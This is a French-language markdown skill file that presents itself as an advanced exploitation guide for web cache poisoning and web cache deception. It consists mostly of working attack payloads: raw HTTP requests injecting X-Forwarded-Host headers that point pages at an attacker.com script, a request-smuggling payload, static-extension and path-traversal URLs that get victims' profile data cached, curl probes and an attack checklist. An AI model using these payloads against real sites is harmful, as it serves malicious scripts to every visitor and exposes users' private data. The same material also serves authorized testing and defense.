---
name: web-cache-poisoning
description: Guide complet d'exploitation du cache web — Web Cache Poisoning, Web Cache Deception, Cache Key manipulation, Request Smuggling via cache, outils
---

# Web Cache Poisoning & Deception — Guide d'Exploitation Avancé

## Références principales
- **PortSwigger** : https://portswigger.net/web-security/web-cache-poisoning
- **HackTricks** : https://hacktricks.wiki/en/pentesting-web/cache-deception/
- **Omer Gil — Cache Deception** : https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html

---

## 1. Web Cache Poisoning — Principes

Le cache (CDN, reverse proxy) stocke une réponse. Si l'attaquant peut injecter un en-tête qui fait partie de la **cache key** mais qui altère la réponse, tous les utilisateurs reçoivent la réponse empoisonnée.

### Cache Key

La cache key est l'ensemble des paramètres identifiant une requête unique. Généralement :
- `Host` header
- `Path` (URL)
- `Query` parameters sélectionnés
- Parfois : `User-Agent`, `Accept`, `Cookie`

**Tout ce qui n'est PAS dans la cache key** est un vecteur de poisoning.

---

## 2. Techniques de Cache Poisoning

### 2.1 Unkeyed Header Injection

En-têtes non inclus dans la cache key mais qui affectent la réponse :

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

Si le serveur utilise `X-Forwarded-Host` pour générer des URLs :
```html
<script src="http://attacker.com/script.js"></script>
```

**En-têtes à tester** :
```
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Port
X-Original-URL
X-Rewrite-URL
X-HTTP-Method-Override
X-HTTP-Method
X-Method-Override
Forwarded
X-Real-IP
X-Originating-IP
```

### 2.2 Cookie Poisoning

Si les cookies sont unkeyed mais affectent le contenu :

```http
GET / HTTP/1.1
Host: target.com
Cookie: session=attacker_controlled
```

### 2.3 Paramètre non keyed

```http
GET /?utm_source=analytics HTTP/1.1
```

Si les paramètres `utm_*` sont exclus de la cache key mais utilisés dans la réponse.

### 2.4 Cache Poisoning via Request Smuggling

Combinaison des deux techniques : le smuggling permet au cache de stocker une réponse malveillante.

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 0
Transfer-Encoding: chunked

0

GET /cachepoison HTTP/1.1
Host: attacker.com
```

---

## 3. Web Cache Deception

**Principe** : Tromper le cache pour qu'il stocke une réponse contenant des données sensibles.

### 3.1 Extension Ruse

Ajouter une extension statique à une URL dynamique :

```bash
# L'URL originale retourne des données utilisateur sensibles
https://target.com/api/profile

# Avec extension statique — le cache stocke la réponse
https://target.com/api/profile/nonexistent.css
https://target.com/api/profile/test.js
https://target.com/api/profile/.css
```

Si le cache voit l'extension `.css`, il peut stocker la réponse contenant le profil de l'utilisateur. Un attaquant accède à la même URL → obtient le profil mis en cache.

### 3.2 Path Traversal Deception

```bash
https://target.com/profile/..%2f..%2fstatic/style.css
https://target.com/profile/;/static/style.css
https://target.com/profile/..;/static/style.css
```

### 3.3 Semicolon Exploitation

```bash
https://target.com/protected/endpoint/;static/style.css
```

---

## 4. Cache Key Manipulation

### 4.1 Host Header Attack

Si deux sites partagent le même cache :

```http
GET / HTTP/1.1
Host: victim.com
→ Cache stocke pour victim.com

GET / HTTP/1.1
Host: attacker.com
→ Si aussi pour victim.com, overlap
```

### 4.2 Query Parameter Override

```http
GET /?key=value&key=malicious
```

---

## 5. Fat GET / Method Override

```http
GET /api/update?param=value HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

body=malicious_data
```

Si le cache accepte le body sur un GET.

---

## 6. Outils

```bash
# Param Miner (Burp extension) — découvre les paramètres et en-têtes cachés
# https://portswigger.net/bappstore/17d2949aa8c44689b72b20a410a7d7e6

# Manual testing avec curl
curl -v -H "X-Forwarded-Host: attacker.com" "https://target.com/"
curl -v -H "X-Forwarded-Scheme: http" "https://target.com/"

# Web Cache Vulnerability Scanner (WCVS)
git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git
cd Web-Cache-Vulnerability-Scanner
python3 wcvs.py -u https://target.com
```

---

## 7. Détection du cache

```bash
# Vérifier si la réponse est en cache
curl -sI https://target.com | grep -i "x-cache\|cf-cache\|age\|cache-control"

# En-têtes indiquant un cache actif
X-Cache: HIT
X-Cache: MISS
CF-Cache-Status: HIT
Age: 123
X-Served-By: cache
Server: Varnish
```

---

## 8. Checklist

```
WEB CACHE POISONING
☐ Identifier l'infrastructure cache (CDN, reverse proxy)
☐ Tester les en-têtes non keyed (X-Forwarded-*, X-Original-URL, etc.)
☐ Tester les cookies non keyed
☐ Tester les paramètres de requête non keyed (utm_, etc.)
☐ Tester le cache poisoning via request smuggling
☐ Vérifier si le cache affecte les réponses dynamiques
☐ Poisoning → tous les utilisateurs reçoivent le payload

WEB CACHE DECEPTION
☐ Ajouter des extensions statiques aux endpoints sensibles
☐ Tester path traversal avec /static/ prefix
☐ Tester les points-virgules
☐ Tester les encodages URL (..%2f)
☐ Vérifier si les données sensibles sont mises en cache
☐ Accéder à l'URL depuis un navigateur non-authentifié

GÉNÉRAL
☐ Documenter les cache keys exactes
☐ Tester le comportement du cache avec des headers différents
☐ Vérifier le Time-To-Live (TTL) du cache
☐ Purge du cache possible ?
```